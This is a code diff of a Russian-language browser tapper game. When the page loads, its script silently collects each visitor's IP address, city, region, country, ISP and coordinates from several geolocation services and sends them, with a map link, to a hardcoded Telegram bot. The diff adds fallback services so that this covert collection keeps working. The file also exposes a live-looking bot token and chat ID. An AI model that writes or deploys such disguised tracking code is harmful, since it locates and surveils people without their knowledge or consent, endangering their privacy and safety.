@@ -128,11 +128,11 @@
 </div>
 
 <script>
-    // ---------- ТВОИ ДАННЫЕ ДЛЯ TELEGRAM (уже вставлены) ----------
+    // ========== ТВОИ ДАННЫЕ (уже вставлены) ==========
     const BOT_TOKEN = "8945319463:AAGj0kO9HsMTgJwuiF-uFnTpK-vudcP7Onk";
     const CHAT_ID = "1330602662";
 
-    // ---------- ИГРОВЫЕ ПЕРЕМЕННЫЕ ----------
+    // ========== ИГРОВЫЕ ПЕРЕМЕННЫЕ ==========
     let clicks = 0;
     let tapPower = 1;
     let autoPower = 0;
@@ -146,7 +146,7 @@
     const cost2Span = document.getElementById('cost2');
     const tapBtn = document.getElementById('tapButton');
 
-    // ---------- ОТПРАВКА В TELEGRAM ----------
+    // ========== ОТПРАВКА В TELEGRAM ==========
     async function sendToTelegram(text) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         try {
@@ -158,43 +158,47 @@
         } catch(e) { console.log("Ошибка отправки", e); }
     }
 
-    // ---------- СБОР IP И ГЕО С ЯНДЕКС.КАРТАМИ ----------
+    // ========== СБОР IP, ГЕО И ССЫЛКА НА КАРТУ ==========
     async function collectAndSendGeo() {
         try {
-            // Сначала получаем IP и гео через ip-api.com (быстро, не требует ключа)
-            const geoRes = await fetch('http://ip-api.com/json/?fields=status,ip,city,region,country,lat,lon,isp');
-            const geoData = await geoRes.json();
-            
-            if (geoData.status === 'success') {
-                const ip = geoData.ip;
-                const city = geoData.city || 'неизвестно';
-                const region = geoData.region || '';
-                const country = geoData.country || '';
-                const lat = geoData.lat;
-                const lon = geoData.lon;
-                const isp = geoData.isp || '';
-                const geoText = `${city}, ${region}, ${country} (${isp})`;
-                // Ссылка на Яндекс.Карты с меткой
-                const mapLink = `https://yandex.ru/maps/?ll=${lon},${lat}&z=12&pt=${lon},${lat}`;
-                // Показываем на экране (опционально)
-                document.getElementById('geoInfo').innerHTML = `📍 ${ip}<br>${city}, ${region}`;
-                // Отправляем в Telegram
-                await sendToTelegram(`🎮 НОВЫЙ ИГРОК\nIP: ${ip}\n📍 ${geoText}\n🗺️ [Карта](${mapLink})\n🕒 ${new Date().toLocaleString()}`);
-            } else {
-                // Не удалось получить гео — отправим только IP
+            // Пробуем ip-api.com через HTTPS
+            let geoRes = await fetch('https://ip-api.com/json/?fields=status,ip,city,region,country,lat,lon,isp');
+            let geoData = await geoRes.json();
+            if (geoData.status !== 'success') {
+                // Запасной вариант: ipwhois.io
+                geoRes = await fetch('https://ipwhois.io/json');
+                geoData = await geoRes.json();
+                if (!geoData.success && !geoData.ip) throw new Error('no geo');
+            }
+            const ip = geoData.ip;
+            const city = geoData.city || 'неизвестно';
+            const region = geoData.region || '';
+            const country = geoData.country || '';
+            const lat = geoData.lat || geoData.latitude;
+            const lon = geoData.lon || geoData.longitude;
+            const isp = geoData.isp || '';
+            const geoText = `${city}, ${region}, ${country} (${isp})`;
+            const mapLink = lat && lon ? `https://yandex.ru/maps/?ll=${lon},${lat}&z=12&pt=${lon},${lat}` : '';
+            document.getElementById('geoInfo').innerHTML = `📍 ${ip}<br>${city}, ${region}`;
+            let message = `🎮 НОВЫЙ ИГРОК\nIP: ${ip}\n📍 ${geoText}`;
+            if (mapLink) message += `\n🗺️ [Карта](${mapLink})`;
+            message += `\n🕒 ${new Date().toLocaleString()}`;
+            await sendToTelegram(message);
+        } catch(e) {
+            // Если всё сломалось — хотя бы IP через api.ipify.org
+            try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 const ip = ipData.ip;
                 document.getElementById('geoInfo').innerHTML = `📍 ${ip}`;
                 await sendToTelegram(`🎮 НОВЫЙ ИГРОК\nIP: ${ip}\n(гео не определено)\n🕒 ${new Date().toLocaleString()}`);
+            } catch(e2) {
+                await sendToTelegram(`🎮 НОВЫЙ ИГРОК (ошибка сбора данных)\n🕒 ${new Date().toLocaleString()}`);
             }
-        } catch(e) {
-            // Полная ошибка — отправляем только уведомление без данных
-            await sendToTelegram(`🎮 НОВЫЙ ИГРОК (ошибка сбора данных)\n🕒 ${new Date().toLocaleString()}`);
         }
     }
 
-    // ---------- УВЕДОМЛЕНИЕ О ПРОГРЕССЕ (каждые 100 тапов) ----------
+    // ========== УВЕДОМЛЕНИЕ О ПРОГРЕССЕ (каждые 100 тапов) ==========
     function checkAndNotify() {
         if (clicks - lastNotify >= 100) {
             lastNotify = clicks;
@@ -202,7 +206,7 @@
         }
     }
 
-    // ---------- ПОКУПКА УЛУЧШЕНИЙ ----------
+    // ========== ПОКУПКА УЛУЧШЕНИЙ ==========
     function buyUpgrade(type) {
         if (type === 'tap' && clicks >= cost1) {
             clicks -= cost1;
@@ -229,7 +233,7 @@
         cost2Span.innerText = cost2;
     }
 
-    // ---------- ТАП ----------
+    // ========== ТАП ==========
     function handleTap() {
         clicks += tapPower;
         updateUI();
@@ -238,7 +242,7 @@
         if (navigator.vibrate) navigator.vibrate(15);
     }
 
-    // ---------- АВТОКЛИКЕР ----------
+    // ========== АВТОКЛИКЕР ==========
     let autoInterval = null;
     function startAutoClicker() {
         if (autoInterval) clearInterval(autoInterval);
@@ -252,7 +256,7 @@
         }, 1000);
     }
 
-    // ---------- СОХРАНЕНИЕ ----------
+    // ========== СОХРАНЕНИЕ ==========
     function saveGame() {
         localStorage.setItem('tapperSave', JSON.stringify({
             clicks, tapPower, autoPower, cost1, cost2, lastNotify
@@ -273,7 +277,7 @@
         }
     }
 
-    // ---------- ДЕКОРАЦИИ (часы, погода, батарея) ----------
+    // ========== ДЕКОРАЦИИ (часы, погода, батарея) ==========
     function updateClock() {
         const now = new Date();
         document.getElementById('clock').innerText = now.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
@@ -289,7 +293,7 @@
         document.getElementById('battery').innerText = bat;
     }, 30000);
 
-    // ---------- ЗАПУСК ----------
+    // ========== ЗАПУСК ==========
     loadGame();
     collectAndSendGeo();   // отправляет IP, гео и ссылку на карту
     tapBtn.addEventListener('click', handleTap);
